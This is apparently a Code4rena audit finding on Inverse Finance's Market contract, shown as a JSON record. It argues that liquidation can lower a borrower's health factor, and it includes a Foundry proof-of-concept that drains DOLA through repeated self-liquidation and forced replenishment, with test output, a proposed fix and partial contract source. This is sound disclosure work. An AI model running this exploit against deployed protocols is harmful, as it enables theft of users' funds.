{
  "Title": "[M-10] Liquidation should make a borrower healthier",
  "Content": "# Lines of code\n\nhttps://github.com/code-423n4/2022-10-inverse/blob/main/src/Market.sol#L559\nhttps://github.com/code-423n4/2022-10-inverse/blob/main/src/Market.sol#L591\n\n\n# Vulnerability details\n\n## Impact\n\nFor a lending pool, borrower's debt healthness can be decided by the health factor, i.e. the collateral value divided by debt. ($C/D$)\n\nThe less the health factor is, the borrower's collateral is more risky of being liquidated.\n\nLiquidation is supposed to make the borrower healthier (by paying debts and claiming some collateral), or else continuous liquidations can follow up and this can lead to a so-called [liquidation crisis](https://medium.com/coinmonks/what-is-liquidation-in-defi-lending-and-borrowing-platforms-3326e0ba8d0).\n\nIn a normal lending protocol, borrower's debt is limited by collateral factor in any case.\n\nFor this protocol, users can force replenishment for the addresses in deficit and the replenishment increases the borrower's debt.\n\nAnd in the current implementation the replenishment is limited so that the new debt is not over than the collateral value.\n\nAs we will see below, this limitation is not enough and if the borrower's debt is over some threshold (still less than collateral value), liquidation makes the borrower debt \"unhealthier\".\n\nAnd repeating liquidation can lead to various problems and we will even show an example that the attacker can take the DOLA out of the market.\n\n## Proof of Concept\n\n### Terminology\n\n$C_f$ - collateralFactorBps / 10000\n\n$L_i$ - liquidationIncentiveBps / 10000\n\n$L_{fe}$ - liquidationFeeBps / 10000\n\n$L_{fa}$ - liquidationFactorBps / 10000\n\n$D$ - user's debt recognized by the market\n\n$C$ - user's collateral held by the escrow\n\n$P$ - collateral price in DOLA, 1 collateral = $P$ DOLAs. For simplicity, assumed to be a constant.\n\nConstraints on the parameters in the current implementation\n\nAll parameters are in range $(0,1)$ and $L_{fe}+L_i<1$.\n\n#### Condition for liquidation\n\n1. Debt is over the credit limit\n   \n   $D>C_f  C  P$\n\n2. Liquidation amount is limited by liquidation factor times user debt.\n   \n   $x\\le L_{fa}D$\n\n#### Study\n\nWe will explore a condition when the liquidation will decrease the health factor after liquidation of $x$.\n\nAfter liquidation, borrower's new debt is $D-x$ and the collateral value is $CP-x(1+L_i+L_{fe})$ (in DOLA) due to the incentives and fee.\n\nLet us see when the new health factor can be less than the previous health factor.\n\n$\\frac {CP-x(1+L_i+L_{fe})}{D-x} < \\frac {CP}{D}$\n\n$CP<D(1+L_i+L_{fe})$\n\n$D>\\frac{CP}{1+L_i+L_{fe}}$\n\nSo if the borrower's debt is over some value depending on the collateral value and liquidation incentive and fee, liquidation of any amount will make the account unhealthier.\n\nNote that the right hand of the above inequality is still less than the collateral value and it means one can intentionally increase an account debt via replenishment so that it is over the threshold.\n\nFurthermore, we notice that it is even possible that the debt can be greater than the above threshold without any replenishment if $C_f>\\frac {1}{1+L_i+L_{fe}}$. The example attacker is written assuming this case but considering the possible side effects of replenishment, we suggest limiting the liquidation function so that it can not decrease the health factor.\n\n#### Example\n\nFor $C_f=0.85, L_{fe}=0.01, L_{fa}=0.5, L_i=0.18$, an attacker can take DOLA out of protocol as below.\nWe believe that these parameters are quite realistic.\nFor these parameters, if an attacker borrows as much as it can, then the debt becomes greater than the threshold already without any replenishment.\n\n```solidity\n// SPDX-License-Identifier: UNLICENSED\npragma solidity ^0.8.13;\n\nimport \"forge-std/Test.sol\";\nimport \"../DBR.sol\";\nimport \"../Market.sol\";\nimport \"./FiRMTest.sol\";\n\ncontract Attack_2 is FiRMTest {\n    address operator;\n\n    function setUp() public {\n        vm.label(gov, \"operator\");\n        operator = gov;\n\n        collateralFactorBps = 8500;\n        liquidationBonusBps = 1800;\n        replenishmentPriceBps = 50000;\n\n        initialize(replenishmentPriceBps, collateralFactorBps, replenishmentIncentiveBps, liquidationBonusBps, callOnDepositCallback);\n\n        vm.startPrank(gov);\n        market.setLiquidationFeeBps(100);\n        market.setLiquidationFactorBps(5000);\n        vm.stopPrank();\n\n        vm.startPrank(chair);\n        fed.expansion(IMarket(address(market)), 1_000_000e18);\n        vm.stopPrank();\n    }\n\n\n    function getMaxForceReplenishable(address user) public view returns (uint) {\n        // once the debt is over the collateral value, getLiquidatableDebt might return more than what are actually in the collateral\n        uint256 currentDeficit = dbr.deficitOf(user);\n        uint256 limitByCollateralValue = 0;\n        if(market.getCollateralValue(user) > market.debts(user))\n        {\n            limitByCollateralValue = (market.getCollateralValue(user) - market.debts(user)) * 10000 / dbr.replenishmentPriceBps();\n        }\n\n        return currentDeficit <= limitByCollateralValue ? currentDeficit : limitByCollateralValue;\n    }\n\n    function getMaxLiquidatable(address user) public view returns (uint) {\n        // once the debt is over the collateral value, getLiquidatableDebt might return more than what are actually in the collateral\n\n        uint256 limitByLiquidationFactor = market.getLiquidatableDebt(user);\n        uint256 limitByLiquidationReward = market.getCollateralValue(user) * 10000 / (10000 + market.liquidationFeeBps() + market.liquidationIncentiveBps());\n\n        return limitByLiquidationFactor >= limitByLiquidationReward ? limitByLiquidationReward : limitByLiquidationFactor;\n    }\n\n    function userTotalValue(address user) public view returns (uint256) {\n        uint P = ethFeed.latestAnswer() / 1e18;\n        uint256 totalValue = DOLA.balanceOf(user) / P + WETH.balanceOf(user);\n        // if the collateral value is greater than the debt, the total value includes the difference because user can repay debt and claim the collateral back\n        if(market.getCollateralValue(user) > market.debts(user))\n            totalValue += (market.getCollateralValue(user) - market.debts(user))/P;\n        return totalValue;\n    }\n\n    function testAttack_2() public {\n        uint P = ethFeed.latestAnswer() / 1e18; // assume the price stays the same\n\n        gibWeth(user, wethTestAmount); // 10^18, 1 eth for collateral\n        gibDOLA(user, wethTestAmount * P); // 10^18, 1 eth in DOLA for liquidation\n\n        // block 1\n        vm.startPrank(user);\n        deposit(wethTestAmount); // collateral\n\n        uint borrowAmount = market.getCreditLimit(user); // borrow as much as it can\n        market.borrow(borrowAmount);\n\n        emit log_named_decimal_uint(\"Total value before exploit\", userTotalValue(user), 18);\n        emit log_named_uint(\"B\", market.debts(user));\n        emit log_named_uint(\"D\", market.debts(user));\n        emit log_named_uint(\"C\", market.getCollateralValue(user));\n        emit log_named_decimal_uint(\"H\", market.getCollateralValue(user) * 1e18 / market.debts(user), 18);\n\n        // start liquidation\n        uint cycle = 1;\n        while(cycle < 100)\n        {\n            emit log_named_uint(\"Cycle\", cycle);\n            uint256 liquidatable = getMaxLiquidatable(user);\n            if(liquidatable > 0)\n            {\n                emit log(\"Liquidation\");\n                emit log_named_uint(\"L\", liquidatable);\n                market.liquidate(user, liquidatable); // liquidate as much as it can\n            }\n            else {\n                emit log(\"Wait a block and force replenishment\");\n                vm.warp(block.timestamp + 1);\n                uint256 replenishable = getMaxForceReplenishable(user);\n                emit log_named_uint(\"R\", replenishable); // force replenish as much as possible, this will incur some loss but will make the address liquidatable\n                market.forceReplenish(user, replenishable);\n            }\n\n\n            emit log_named_uint(\"D\", market.debts(user));\n            emit log_named_uint(\"C\", market.getCollateralValue(user));\n            emit log_named_decimal_uint(\"H\", market.getCollateralValue(user) * 1e18 / market.debts(user), 18);\n\n            ++ cycle;\n\n            uint256 totalValue = userTotalValue(user);\n            emit log_named_decimal_uint(\"Total value the user owns\",  totalValue, 18);\n            if(totalValue > wethTestAmount * 2)\n                break; // no need to continue, the attacker already took profit from the market\n        }\n    }\n}\n\n```\n\nThe test results are as below. We can see that the health factor is decreasing for every liquidation and this ultimately makes the debt greater than collateral value. Then the attacker's total value increases for every liquidation and finally it gets more value than the initial status.\n\n```\n> forge test -vv --match-test testAttack_2\n  Total value before exploit: 2.000000000000000000\n  B: 1360000000000000000000\n  D: 1360000000000000000000\n  C: 1600000000000000000000\n  H: 1.176470588235294117\n  Cycle: 1\n  Wait a block and force replenishment\n  R: 43125317097919\n  D: 1360000215626585489595\n  C: 1600000000000000000000\n  H: 1.176470401707135551\n  Total value the user owns: 1.999999871971714865\n  Cycle: 2\n  Liquidation\n  L: 680000107813292744797\n  D: 680000107813292744798\n  C: 790799871702181636800\n  H: 1.162940803414271107\n  Total value the user owns: 1.995749871297881786\n  Cycle: 3\n  Liquidation\n  L: 340000053906646372399\n  D: 340000053906646372399\n  C: 386199807553272457600\n  H: 1.135881606828542227\n  Total value the user owns: 1.993624870960965247\n  Cycle: 4\n  Liquidation\n  L: 170000026953323186199\n  D: 170000026953323186200\n  C: 183899775478817868800\n  H: 1.081763213657084471\n  Total value the user owns: 1.992562370792506977\n  Cycle: 5\n  Liquidation\n  L: 85000013476661593100\n  D: 85000013476661593100\n  C: 82749759441590576000\n  H: 0.973526427314168978\n  Total value the user owns: 1.993437529480197230\n  Cycle: 6\n  Liquidation\n  L: 42500006738330796550\n  D: 42500006738330796550\n  C: 32174751422976931200\n  H: 0.757052854628338029\n  Total value the user owns: 1.998218780238259443\n  Cycle: 7\n  Liquidation\n  L: 21250003369165398275\n  D: 21250003369165398275\n  C: 6887247413670110400\n  H: 0.324105709256676206\n  Total value the user owns: 2.000609405617290549\n```\n\n## Tools Used\n\nFoundry\n\n## Recommended Mitigation Steps\n\nMake sure the liquidation does not decrease the health index in the function `liquidate`.\nWith this mitigation, we also suggest limiting the debt increase in the function `forceReplenish` so that the new debt after replenish will not be over the threshold.\n\n```solidity\nfunction liquidate(address user, uint repaidDebt) public {\n    require(repaidDebt > 0, \"Must repay positive debt\");\n    uint debt = debts[user];\n    require(getCreditLimitInternal(user) < debt, \"User debt is healthy\");\n    require(repaidDebt <= debt * liquidationFactorBps / 10000, \"Exceeded liquidation factor\");\n\n    // ****************************************\n    uint beforeHealthFactor = getCollateralValue(user) * 1e18 / debt; // @audit remember the health factor before liquidation\n    // ****************************************\n\n    uint price = oracle.getPrice(address(collateral), collateralFactorBps); // collateral price in dola\n    uint liquidatorReward = repaidDebt * 1 ether / price; // collateral amount\n    liquidatorReward += liquidatorReward * liquidationIncentiveBps / 10000;\n    debts[user] -= repaidDebt;\n    totalDebt -= repaidDebt;\n\n    dbr.onRepay(user, repaidDebt);\n    dola.transferFrom(msg.sender, address(this), repaidDebt);\n    IEscrow escrow = predictEscrow(user);\n    escrow.pay(msg.sender, liquidatorReward);\n    if(liquidationFeeBps > 0) {\n        uint liquidationFee = repaidDebt * 1 ether / price * liquidationFeeBps / 10000;\n        if(escrow.balance() >= liquidationFee) {\n            escrow.pay(gov, liquidationFee);\n        }\n    }\n\n    // ****************************************\n    uint afterHealthFactor = getCollateralValue(user) * 1e18 / debts[user]; // @audit health factor after liquidation\n    require(afterHealthFactor >= beforeHealthFactor, \"Liquidation should not decrease the health factor of the address\"); // @audit new check\n    // ****************************************\n\n    emit Liquidate(user, msg.sender, repaidDebt, liquidatorReward);\n}\n\nfunction forceReplenish(address user, uint amount) public {\n    uint deficit = dbr.deficitOf(user);\n    require(deficit > 0, \"No DBR deficit\");\n    require(deficit >= amount, \"Amount > deficit\");\n    uint replenishmentCost = amount * dbr.replenishmentPriceBps() / 10000;\n    uint replenisherReward = replenishmentCost * replenishmentIncentiveBps / 10000;\n    debts[user] += replenishmentCost;\n    uint collateralValue = getCollateralValueInternal(user);\n\n    // ****************************************\n    // require(collateralValue >= debts[user], \"Exceeded collateral value\");\n    require(collateralValue >= debts[user] * (1 + liquidationIncentiveBps / 10000 + liquidationFeeBps / 10000), \"Debt exceeds safe collateral limit\"); // @audit more strict limit\n    // ****************************************\n\n    totalDebt += replenishmentCost;\n    dbr.onForceReplenish(user, amount);\n    dola.transfer(msg.sender, replenisherReward);\n    emit ForceReplenish(user, msg.sender, amount, replenishmentCost, replenisherReward);\n}\n```",
  "Impact": "MEDIUM",
  "Source": "https://code4rena.com/contests/2022-10-inverse-finance-contest",
  "Code": [
    {
      "filename": "src/Market.sol",
      "content": "// SPDX-License-Identifier: UNLICENSED\npragma solidity ^0.8.13;\n\n// Caution. We assume all failed transfers cause reverts and ignore the returned bool.\ninterface IERC20 {\n    function transfer(address,uint) external returns (bool);\n    function transferFrom(address,address,uint) external returns (bool);\n    function balanceOf(address) external view returns (uint);\n}\n\ninterface IOracle {\n    function getPrice(address,uint) external returns (uint);\n    function viewPrice(address,uint) external view returns (uint);\n}\n\ninterface IEscrow {\n    function initialize(IERC20 _token, address beneficiary) external;\n    function onDeposit() external;\n    function pay(address recipient, uint amount) external;\n    function balance() external view returns (uint);\n}\n\ninterface IDolaBorrowingRights {\n    function onBorrow(address user, uint additionalDebt) external;\n    function onRepay(address user, uint repaidDebt) external;\n    function onForceReplenish(address user, uint amount) external;\n    function balanceOf(address user) external view returns (uint);\n    function deficitOf(address user) external view returns (uint);\n    function replenishmentPriceBps() external view returns (uint);\n}\n\ninterface IBorrowController {\n    function borrowAllowed(address msgSender, address borrower, uint amount) external returns (bool);\n}\n\ncontract Market {\n\n    address public gov;\n    address public lender;\n    address public pauseGuardian;\n    address public immutable escrowImplementation;\n    IDolaBorrowingRights public immutable dbr;\n    IBorrowController public borrowController;\n    IERC20 public immutable dola = IERC20(0x865377367054516e17014CcdED1e7d814EDC9ce4);\n    IERC20 public immutable collateral;\n    IOracle public oracle;\n    uint public collateralFactorBps;\n    uint public replenishmentIncentiveBps;\n    uint public liquidationIncentiveBps;\n    uint public liquidationFeeBps;\n    uint public liquidationFactorBps = 5000; // 50% by default\n    bool immutable callOnDepositCallback;\n    bool public borrowPaused;\n    uint public totalDebt;\n    uint256 internal immutable INITIAL_CHAIN_ID;\n    bytes32 internal immutable INITIAL_DOMAIN_SEPARATOR;\n    mapping (address => IEscrow) public escrows; // user => escrow\n    mapping (address => uint) public debts; // user => debt\n    mapping(address => uint256) public nonces; // user => nonce\n\n    constructor (\n        address _gov,\n        address _lender,\n        address _pauseGuardian,\n        address _escrowImplementation,\n        IDolaBorrowingRights _dbr,\n        IERC20 _collateral,\n        IOracle _oracle,\n        uint _collateralFactorBps,\n        uint _replenishmentIncentiveBps,\n        uint _liquidationIncentiveBps,\n        bool _callOnDepositCallback\n    ) {\n        require(_collateralFactorBps < 10000, \"Invalid collateral factor\");\n        require(_liquidationIncentiveBps > 0 && _liquidationIncentiveBps < 10000, \"Invalid liquidation incentive\");\n        require(_replenishmentIncentiveBps < 10000, \"Replenishment incentive must be less than 100%\");\n        gov = _gov;\n        lender = _lender;\n        pauseGuardian = _pauseGuardian;\n        escrowImplementation = _escrowImplementation;\n        dbr = _dbr;\n        collateral = _collateral;\n        oracle = _oracle;\n        collateralFactorBps = _collateralFactorBps;\n        replenishmentIncentiveBps = _replenishmentIncentiveBps;\n        liquidationIncentiveBps = _liquidationIncentiveBps;\n        callOnDepositCallback = _callOnDepositCallback;\n        INITIAL_CHAIN_ID = block.chainid;\n        INITIAL_DOMAIN_SEPARATOR = computeDomainSeparator();\n    }\n    \n    modifier onlyGov {\n        require(msg.sender == gov, \"Only gov can call this function\");\n        _;\n    }\n\n    function DOMAIN_SEPARATOR() public view virtual returns (bytes32) {\n        return block.chainid == INITIAL_CHAIN_ID ? INITIAL_DOMAIN_SEPARATOR : computeDomainSeparator();\n    }\n\n    function computeDomainSeparator() internal view virtual returns (bytes32) {\n        return\n            keccak256(\n                abi.encode(\n                    keccak256(\"EIP712Domain(string name,string version,uint256 chainId,address verifyingContract)\"),\n                    keccak256(bytes(\"DBR MARKET\")),\n                    keccak256(\"1\"),\n                    block.chainid,\n                    address(this)\n                )\n            );\n    }\n\n    /**\n    @notice sets the oracle to a new oracle. Only callable by governance.\n    @param _oracle The new oracle conforming to the IOracle interface.\n    */\n    function setOracle(IOracle _oracle) public onlyGov { oracle = _oracle; }\n\n    /**\n    @notice sets the borrow controller to a new borrow controller. Only callable by governance.\n    @param _borrowController The new borrow controller conforming to the IBorrowController interface.\n    */\n    function setBorrowController(IBorrowController _borrowController) public onlyGov { borrowController = _borrowController; }\n\n    /**\n    @notice sets the address of governance. Only callable by governance.\n    @param _gov Address of the new governance.\n    */\n    function setGov(address _gov) public onlyGov { gov = _gov; }\n\n    /**\n    @notice sets the lender to a new lender. The lender is allowed to recall dola from the contract. Only callable by governance.\n    @param _lender Address of the new lender.\n    */\n    function setLender(address _lender) public onlyGov { lender = _lender; }\n\n    /**\n    @notice sets the pause guardian. The pause guardian can pause borrowing. Only callable by governance.\n    @param _pauseGuardian Address of the new pauseGuardian.\n    */\n    function setPauseGuardian(address _pauseGuardian) public onlyGov { pauseGuardian = _pauseGuardian; }\n    \n    /**\n    @notice sets the Collateral Factor requirement of the market as measured in basis points. 1 = 0.01%. Only callable by governance.\n    @dev Collateral factor mus be set below 100%\n    @param _collateralFactorBps The new collateral factor as measured in basis points. \n    */\n    function setCollateralFactorBps(uint _collateralFactorBps) public onlyGov {\n        require(_collateralFactorBps < 10000, \"Invalid collateral factor\");\n        collateralFactorBps = _collateralFactorBps;\n    }\n    \n    /**\n    @notice sets the Liquidation Factor of the market as denoted in basis points.\n     The liquidation Factor denotes the maximum amount of debt that can be liquidated in basis points.\n     At 5000, 50% of of a borrower's underwater debt can be liquidated. Only callable by governance.\n    @dev Must be set between 1 and 10000.\n    @param _liquidationFactorBps The new liquidation factor in basis points. 1 = 0.01%/\n    */\n    function setLiquidationFactorBps(uint _liquidationFactorBps) public onlyGov {\n        require(_liquidationFactorBps > 0 && _liquidationFactorBps <= 10000, \"Invalid liquidation factor\");\n        liquidationFactorBps = _liquidationFactorBps;\n    }\n\n    /**\n    @notice sets the Replenishment Incentive of the market as denoted in basis points.\n     The Replenishment Incentive is the percentage paid out to replenishers on a successful forceReplenish call, denoted in basis points.\n    @dev Must be set between 1 and 10000.\n    @param _replenishmentIncentiveBps The new replenishment incentive set in basis points. 1 = 0.01%\n    */\n    function setReplenismentIncentiveBps(uint _replenishmentIncentiveBps) public onlyGov {\n        require(_replenishmentIncentiveBps > 0 && _replenishmentIncentiveBps < 10000, \"Invalid replenishment incentive\");\n        replenishmentIncentiveBps = _replenishmentIncentiveBps;\n    }\n\n    /**\n    @notice sets the Liquidation Incentive of the market as denoted in basis points.\n     The Liquidation Incentive is the percentage paid out to liquidators of a borrower's debt when successfully liquidated.\n    @dev Must be set between 0 and 10000 - liquidation fee.\n    @param _liquidationIncentiveBps The new liqudation incentive set in basis points. 1 = 0.01% \n    */\n    function setLiquidationIncentiveBps(uint _liquidationIncentiveBps) public onlyGov {\n        require(_liquidationIncentiveBps > 0 && _liquidationIncentiveBps + liquidationFeeBps < 10000, \"Invalid liquidation incentive\");\n        liquidationIncentiveBps = _liquidationIncentiveBps;\n    }\n\n    /**\n    @notice sets the Liquidation Fee of the market as denoted in basis points.\n     The Liquidation Fee is the percentage paid out to governance of a borrower's debt when successfully liquidated.\n    @dev Must be set between 0 and 10000 - liquidation factor.\n    @param _liquidationFeeBps The new liquidation fee set in basis points. 1 = 0.01%\n    */\n    function setLiquidationFeeBps(uint _liquidationFeeBps) public onlyGov {\n        require(_liquidationFeeBps > 0 && _liquidationFeeBps + liquidationIncentiveBps < 10000, \"Invalid liquidation fee\");\n        liquidationFeeBps = _liquidationFeeBps;\n    }\n\n    /**\n    @notice Recalls amount of DOLA to the lender.\n    @param amount The amount od DOLA to recall to the the lender.\n    */\n    function recall(uint amount) public {\n        require(msg.sender == lender, \"Only lender can recall\");\n        dola.transfer(msg.sender, amount);\n    }\n\n    /**\n    @notice Pauses or unpauses borrowing for the market. Only gov can unpause a market, while gov and pauseGuardian can pause it.\n    @param _value Boolean representing the state pause state of borrows. true = paused, false = unpaused.\n    */\n    function pauseBorrows(bool _value) public {\n        if(_value) {\n            require(msg.sender == pauseGuardian || msg.sender == gov, \"Only pause guardian or governance can pause\");\n        } else {\n            require(msg.sender == gov, \"Only governance can unpause\");\n        }\n        borrowPaused = _value;\n    }\n\n    /**\n    @notice Internal function for creating an escrow for users to deposit collateral in.\n    @dev Uses create2 and minimal proxies to create the escrow at a deterministic address\n    @param user The address of the user to create an escrow for.\n    */\n    function createEscrow(address user) internal returns (IEscrow instance) {\n        address implementation = escrowImplementation;\n        /// @solidity memory-safe-assembly\n        assembly {\n            let ptr := mload(0x40)\n            mstore(ptr, 0x3d602d80600a3d3981f3363d3d373d3d3d363d73000000000000000000000000)\n            mstore(add(ptr, 0x14), shl(0x60, implementation))\n            mstore(add(ptr, 0x28), 0x5af43d82803e903d91602b57fd5bf30000000000000000000000000000000000)\n            instance := create2(0, ptr, 0x37, user)\n        }\n        require(instance != IEscrow(address(0)), \"ERC1167: create2 failed\");\n        emit CreateEscrow(user, address(instance));\n    }\n\n    /**\n    @notice Internal function for getting the escrow of a user.\n    @dev If the escrow doesn't exist, an escrow contract is deployed.\n    @param user The address of the user owning the escrow.\n    */\n    function getEscrow(address user) internal returns (IEscrow) {\n        if(escrows[user] != IEscrow(address(0))) return escrows[user];\n        IEscrow escrow = createEscrow(user);\n        escrow.initialize(collateral, user);\n        escrows[user] = escrow;\n        return escrow;\n    }\n\n    /**\n    @notice Deposit amount of collateral into escrow\n    @dev Will deposit the amount into the escrow contract.\n    @param amount Amount of collateral token to deposit.\n    */\n    function deposit(uint amount) public {\n        deposit(msg.sender, amount);\n    }\n\n    /**\n    @notice Deposit and borrow in a single transaction.\n    @param amountDeposit Amount of collateral token to deposit into escrow.\n    @param amountBorrow Amount of DOLA to borrow.\n    */\n    function depositAndBorrow(uint amountDeposit, uint amountBorrow) public {\n        deposit(amountDeposit);\n        borrow(amountBorrow);\n    }\n\n    /**\n    @notice Deposit amount of collateral into escrow on behalf of msg.sender\n    @dev Will deposit the amount into the escrow contract.\n    @param user User to deposit on behalf of.\n    @param amount Amount of collateral token to deposit.\n    */\n    function deposit(address user, uint amount) public {\n        IEscrow escrow = getEscrow(user);\n        collateral.transferFrom(msg.sender, address(escrow), amount);\n        if(callOnDepositCallback) {\n            escrow.onDeposit();\n        }\n        emit Deposit(user, amount);\n    }\n\n    /**\n    @notice View function for predicting the deterministic escrow address of a user.\n    @dev Only use deposit() function for deposits and NOT the predicted escrow address unless you know what you're doing\n    @param user Address of the user owning the escrow.\n    */\n    function predictEscrow(address user) public view returns (IEscrow predicted) {\n        address implementation = escrowImplementation;\n        address deployer = address(this);\n        /// @solidity memory-safe-assembly\n        assembly {\n            let ptr := mload(0x40)\n            mstore(ptr, 0x3d602d80600a3d3981f3363d3d373d3d3d363d73000000000000000000000000)\n            mstore(add(ptr, 0x14), shl(0x60, implementation))\n            mstore(add(ptr, 0x28), 0x5af43d82803e903d91602b57fd5bf3ff00000000000000000000000000000000)\n            mstore(add(ptr, 0x38), shl(0x60, deployer))\n            mstore(add(ptr, 0x4c), user)\n            mstore(add(ptr, 0x6c), keccak256(ptr, 0x37))\n            predicted := keccak256(add(ptr, 0x37), 0x55)\n        }\n    }\n\n    /**\n    @notice View function for getting the dollar value of the user's collateral in escrow for the market.\n    @param user Address of the user.\n    */\n    function getCollateralValue(address user) public view returns (uint) {\n        IEscrow escrow = predictEscrow(user);\n        uint collateralBalance = escrow.balance();\n        return collateralBalance * oracle.viewPrice(address(collateral), collateralFactorBps) / 1 ether;\n    }\n\n    /**\n    @notice Internal function for getting the dollar value of the user's collateral in escrow for the market.\n    @dev Updates the lowest price comparisons of the pessimistic oracle\n    @param user Address of the user.\n    */\n    function getCollateralValueInternal(address user) internal returns (uint) {\n        IEscrow escrow = predictEscrow(user);\n        uint collateralBalance = escrow.balance();\n        return collateralBalance * oracle.getPrice(address(collateral), collateralFactorBps) / 1 ether;\n    }\n\n    /**\n    @notice View function for getting the credit limit of a user.\n    @dev To calculate the available credit, subtract user debt from credit limit.\n    @param user Address of the user.\n    */\n    function getCreditLimit(address user) public view returns (uint) {\n        uint collateralValue = getCollateralValue(user);\n        return collateralValue * collateralFactorBps / 10000;\n    }\n\n    /**\n    @notice Internal function for getting the credit limit of a user.\n    @dev To calculate the available credit, subtract user debt from credit limit. Updates the pessimistic oracle.\n    @param user Address of the user.\n    */\n    function getCreditLimitInternal(address user) internal returns (uint) {\n        uint collateralValue = getCollateralValueInternal(user);\n        return collateralValue * collateralFactorBps / 10000;\n    }\n    /**\n    @notice Internal function for getting the withdrawal limit of a user.\n     The withdrawal limit is how much collateral a user can withdraw before their loan would be underwater. Updates the pessimistic oracle.\n    @param user Address of the user.\n    */\n    function getWithdrawalLimitInternal(address user) internal returns (uint) {\n        IEscrow escrow = predictEscrow(user);\n        uint collateralBalance = escrow.balance();\n        if(collateralBalance == 0) return 0;\n        uint debt = debts[user];\n        if(debt == 0) return collateralBalance;\n        if(collateralFactorBps == 0) return 0;\n        uint minimumCollateral = debt * 1 ether / oracle.getPrice(address(collateral), collateralFactorBps) * 10000 / collateralFactorBps;\n        if(collateralBalance <= minimumCollateral) return 0;\n        return collateralBalance - minimumCollateral;\n    }\n\n    /**\n    @notice View function for getting the withdrawal limit of a user.\n     The withdrawal limit is how much collateral a user can withdraw before their loan would be underwater.\n    @param user Address of the user.\n    */\n    function getWithdrawalLimit(address user) public view returns (uint) {\n        IEscrow escrow = predictEscrow(user);\n        uint collateralBalance = escrow.balance();\n        if(collateralBalance == 0) return 0;\n        uint debt = debts[user];\n        if(debt == 0) return collateralBalance;\n        if(collateralFactorBps == 0) return 0;\n        uint minimumCollateral = debt * 1 ether / oracle.viewPrice(address(collateral), collateralFactorBps) * 10000 / collateralFactorBps;\n        if(collateralBalance <= minimumCollateral) return 0;\n        return collateralBalance - minimumCollateral;\n    }\n\n    /**\n    @notice Internal function for borrowing DOLA against collateral.\n    @dev This internal function is shared between the borrow and borrowOnBehalf function\n    @param borrower The address of the borrower that debt will be accrued to.\n    @param to The address that will receive the borrowed DOLA\n    @param amount The amount of DOLA to be borrowed\n    */\n    function borrowInternal(address borrower, address to, uint amount) internal {\n        require(!borrowPaused, \"Borrowing is paused\");\n        if(borrowController != IBorrowController(address(0))) {\n            require(borrowController.borrowAllowed(msg.sender, borrower, amount), \"Denied by borrow controller\");\n        }\n        uint credit = getCreditLimitInternal(borrower);\n        debts[borrower] += amount;\n        require(credit >= debts[borrower], \"Exceeded credit limit\");\n        totalDebt += amount;\n        dbr.onBorrow(borrower, amount);\n        dola.transfer(to, amount);\n        emit Borrow(borrower, amount);\n    }\n\n    /**\n    @notice Function for borrowing DOLA.\n    @dev Will borrow to msg.sender\n    @param amount The amount of DOLA to be borrowed.\n    */\n    function borrow(uint amount) public {\n        borrowInternal(msg.sender, msg.sender, amount);\n    }\n\n    /**\n    @notice Function for using a signed message to borrow on behalf of an address owning an escrow with collateral.\n    @dev Signed messaged can be invalidated by incrementing the nonce. Will always borrow to the msg.sender.\n    @param from The address of the user being borrowed from\n    @param amount The amount to be borrowed\n    @param deadline Timestamp after which the signed message will be invalid\n    @param v The v param of the ECDSA signature\n    @param r The r param of the ECDSA signature\n    @param s The s param of the ECDSA signature\n    */\n    function borrowOnBehalf(address from, uint amount, uint deadline, uint8 v, bytes32 r, bytes32 s) public {\n        require(deadline >= block.timestamp, \"DEADLINE_EXPIRED\");\n        unchecked {\n            address recoveredAddress = ecrecover(\n                keccak256(\n                    abi.encodePacked(\n                        \"\\x19\\x01\",\n                        DOMAIN_SEPARATOR(),\n                        keccak256(\n                            abi.encode(\n                                keccak256(\n                                    \"BorrowOnBehalf(address caller,address from,uint256 amount,uint256 nonce,uint256 deadline)\"\n                                ),\n                                msg.sender,\n                                from,\n                                amount,\n                                nonces[from]++,\n                                deadline\n                            )\n                        )\n                    )\n                ),\n                v,\n                r,\n                s\n            );\n            require(recoveredAddress != address(0) && recoveredAddress == from, \"INVALID_SIGNER\");\n            borrowInternal(from, msg.sender, amount);\n        }\n    }\n\n    /**\n    @notice Internal function for withdrawing from the escrow\n    @dev The internal function is shared by the withdraw function and withdrawOnBehalf function\n    @param from The address owning the escrow to withdraw from.\n    @param to The address receiving the tokens\n    @param amount The amount being withdrawn.\n    */\n    function withdrawInternal(address from, address to, uint amount) internal {\n        uint limit = getWithdrawalLimitInternal(from);\n        require(limit >= amount, \"Insufficient withdrawal limit\");\n        IEscrow escrow = getEscrow(from);\n        escrow.pay(to, amount);\n        emit Withdraw(from, to, amount);\n    }\n\n    /**\n    @notice Function for withdrawing to msg.sender.\n    @param amount Amount to withdraw.\n    */\n    function withdraw(uint amount) public {\n        withdrawInternal(msg.sender, msg.sender, amount);\n    }\n\n    /**\n    @notice Function for using a signed message to withdraw on behalf of an address owning an escrow with collateral.\n    @dev Signed messaged can be invalidated by incrementing the nonce. Will always withdraw to the msg.sender.\n    @param from The address of the user owning the escrow being withdrawn from\n    @param amount The amount to be withdrawn\n    @param deadline Timestamp after which the signed message will be invalid\n    @param v The v param of the ECDSA signature\n    @param r The r param of the ECDSA signature\n    @param s The s param of the ECDSA signature\n    */\n    function withdrawOnBehalf(address from, uint amount, uint deadline, uint8 v, bytes32 r, bytes32 s) public {\n        require(deadline >= block.timestamp, \"DEADLINE_EXPIRED\");\n        unchecked {\n            address recoveredAddress = ecrecover(\n                keccak256(\n                    abi.encodePacked(\n                        \"\\x19\\x01\",\n                        DOMAIN_SEPARATOR(),\n                        keccak256(\n                            abi.encode(\n                                keccak256(\n                                    \"WithdrawOnBehalf(address caller,address from,uint256 amount,uint256 nonce,uint256 deadline)\"\n                                ),\n                                msg.sender,\n                                from,\n                                amount,\n                                nonces[from]++,\n                                deadline\n                            )\n                        )\n                    )\n                ),\n                v,\n                r,\n                s\n            );\n            require(recoveredAddress != address(0) && recoveredAddress == from, \"INVALID_SIGNER\");\n            withdrawInternal(from, msg.sender, amount);\n        }\n    }\n\n    /**\n    @notice Function for incrementing the nonce of the msg.sender, making their latest signed message unusable.\n    */\n    function invalidateNonce() public {\n        nonces[msg.sender]++;\n    }\n    \n    /**\n    @notice Function for repaying debt on behalf of user. Debt must be repaid in DOLA.\n    @dev Querying debts[user] and using it for amount to be repaid will always result in full repayment, unless the user has a DBR deficit.\n     If the user has a DBR deficit, they risk initial debt being accrued by forced replenishments.\n    @param user Address of the user whose debt is being repaid\n    @param amount DOLA amount to be repaid\n    */\n    function repay(address user, uint amount) public {\n        uint debt = debts[user];\n        require(debt >= amount, \"Insufficient debt\");\n        debts[user] -= 